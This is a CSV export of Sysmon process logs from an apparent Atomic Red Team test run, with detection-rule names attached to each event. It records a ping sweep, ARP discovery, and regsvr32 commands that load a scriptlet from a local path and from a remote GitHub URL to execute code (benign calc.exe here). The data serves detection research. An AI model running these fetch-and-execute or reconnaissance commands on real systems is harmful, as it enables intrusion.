2019-07-19T14:53:38.043576+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4020,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 3120
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D972-5D31-0000-00106BA43700
CommandLine: ping  -n 1 -w 100 192.168.1.247
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:38.039
"
2019-07-19T14:53:38.588994+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4021,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 6976
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D972-5D31-0000-001057A73700
CommandLine: ping  -n 1 -w 100 192.168.1.248
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:38.540
"
2019-07-19T14:53:39.024685+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4022,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 2440
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D973-5D31-0000-0010A3AA3700
CommandLine: ping  -n 1 -w 100 192.168.1.249
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:39.020
"
2019-07-19T14:53:39.518485+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4023,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 5100
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D973-5D31-0000-00108FAD3700
CommandLine: ping  -n 1 -w 100 192.168.1.250
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:39.513
"
2019-07-19T14:53:40.006782+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4024,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 7144
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D974-5D31-0000-00107BB03700
CommandLine: ping  -n 1 -w 100 192.168.1.251
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:40.002
"
2019-07-19T14:53:40.535082+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4025,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 5612
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D974-5D31-0000-001068B33700
CommandLine: ping  -n 1 -w 100 192.168.1.252
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:40.530
"
2019-07-19T14:53:40.982570+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4026,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 196
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D974-5D31-0000-001006BD3700
CommandLine: ping  -n 1 -w 100 192.168.1.253
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:40.930
"
2019-07-19T14:53:41.530685+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4027,MSEDGEWIN10,"Image: C:\Windows\System32\PING.EXE
RuleName: ''
Description: TCP/IP Ping Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4528
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8757646428A176F76E6F38458A25902A8FEBA9C0,MD5=56633150D77AE242D07727B0564430BB,SHA256=741AD992403C78A8A7DBD97C74FDA06594A247E9E2FA05A40BB6945403A90056,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: 747F3D96-D8F6-5D31-0000-001091D13300
ProcessId: 1624
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D975-5D31-0000-001099C23700
CommandLine: ping  -n 1 -w 100 192.168.1.254
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:41.524
"
2019-07-19T14:53:42.061925+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4028,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6412
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-00104AC63700
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:42.051
"
2019-07-19T14:53:42.276408+00:00,Hacktool - EDR-Freeze Execution;Suspicious Network Command;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4029,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6292
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-0010DBCC3700
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""arp -a""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:42.259
"
2019-07-19T14:53:42.301844+00:00,Hacktool - EDR-Freeze Execution;Suspicious Network Command;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4030,MSEDGEWIN10,"Image: C:\Windows\System32\ARP.EXE
RuleName: ''
Description: TCP/IP Arp Command
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""arp -a""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6292
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=EB1C8778D17B5393B857AD80733EE00CBEA300A1,MD5=4ACDF3F896F2E34FBBB4BBA816E89B3E,SHA256=F0B2969246808AAA41DC74FE8138A542560564474DFBA79DA329B44A951CC574,IMPHASH=02E80B21355ED722444F540585E82D1D
ParentProcessGuid: 747F3D96-D976-5D31-0000-0010DBCC3700
ProcessId: 1340
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-001034CF3700
CommandLine: arp  -a
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:42.290
"
2019-07-19T14:53:42.404357+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4031,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6312
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-0010D8D53700
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:42.384
"
2019-07-19T14:53:42.815966+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4032,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4444
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-001041E83700
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:42.803
"
2019-07-19T14:53:42.841951+00:00,Hacktool - EDR-Freeze Execution;Scripting/CommandLine Process Spawned Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4033,MSEDGEWIN10,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4444
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=FC99212A5F929D707AF49E8151CAB1E30FF658EB,MD5=DA0E9A7777D16AE18BD9C642A9F42223,SHA256=F098FA150D9199732B4EC2E81528A951503A30F75AFEBF7E7A48360301758C67,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F
ParentProcessGuid: 747F3D96-D976-5D31-0000-001041E83700
ProcessId: 2332
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D976-5D31-0000-001093EA3700
CommandLine: regsvr32.exe  /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:42.834
"
2019-07-19T14:53:43.445040+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Child Process Of Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4035,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: regsvr32.exe  /s /u /i:C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct scrobj.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2332
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-D976-5D31-0000-001093EA3700
ProcessId: 3848
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D977-5D31-0000-00100A0E3800
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\regsvr32.exe
UtcTime: 2019-07-19 14:53:43.339
"
2019-07-19T14:53:43.574378+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4036,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1476
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D977-5D31-0000-0010771B3800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:43.460
"
2019-07-19T14:53:44.026061+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4037,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2832
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D978-5D31-0000-0010442F3800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:44.010
"
2019-07-19T14:53:44.054072+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Regsvr32 HTTP/FTP Pattern;Scripting/CommandLine Process Spawned Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4038,MSEDGEWIN10,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2832
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=FC99212A5F929D707AF49E8151CAB1E30FF658EB,MD5=DA0E9A7777D16AE18BD9C642A9F42223,SHA256=F098FA150D9199732B4EC2E81528A951503A30F75AFEBF7E7A48360301758C67,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F
ParentProcessGuid: 747F3D96-D978-5D31-0000-0010442F3800
ProcessId: 2076
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D978-5D31-0000-0010EB313800
CommandLine: regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:44.049
"
2019-07-19T14:53:45.157638+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4040,MSEDGEWIN10,"Image: C:\Windows\System32\svchost.exe
RuleName: ''
Description: Host Process for Windows Services
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 572
LogonGuid: 747F3D96-D4A5-5D31-0000-0020E5030000
Hashes: SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: 747F3D96-D4A4-5D31-0000-00100F520000
ProcessId: 6152
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-D978-5D31-0000-00101E7A3800
CommandLine: C:\Windows\system32\svchost.exe -k LocalService -p -s BthAvctpSvc
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\LOCAL SERVICE
LogonId: '0x3e5'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-07-19 14:53:44.974
"
2019-07-19T14:53:46.204886+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Child Process Of Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4041,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2076
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-D978-5D31-0000-0010EB313800
ProcessId: 4336
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97A-5D31-0000-00105DA83800
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\regsvr32.exe
UtcTime: 2019-07-19 14:53:46.135
"
